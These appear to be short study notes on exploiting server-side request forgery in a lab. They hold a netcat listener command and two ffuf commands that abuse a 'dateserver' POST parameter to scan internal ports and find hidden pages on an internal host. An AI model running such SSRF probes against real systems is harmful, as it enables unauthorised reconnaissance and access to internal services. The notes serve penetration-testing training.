# Server-Side Request Forgery (SSRF)
- http:// or https://
- file://
- gopher://
## Identifying
### Confirming SSRF
<img width="1552" height="264" alt="image" src="https://github.com/user-attachments/assets/911ee48e-dfa8-4b2a-b10c-a0917e32b726" />
It's possible to identifying with:
- Ping
<img width="1553" height="220" alt="image" src="https://github.com/user-attachments/assets/5c4e5f7a-e469-45b6-b280-594c981abe0e" />

```bash
nc -lnvp 8000
```
- Enter to the web page
<img width="1547" height="344" alt="image" src="https://github.com/user-attachments/assets/0fa1622a-6f63-474f-8435-1a9bbef16855" />

### Enumerating the System
```bash
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

## Explotation
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```
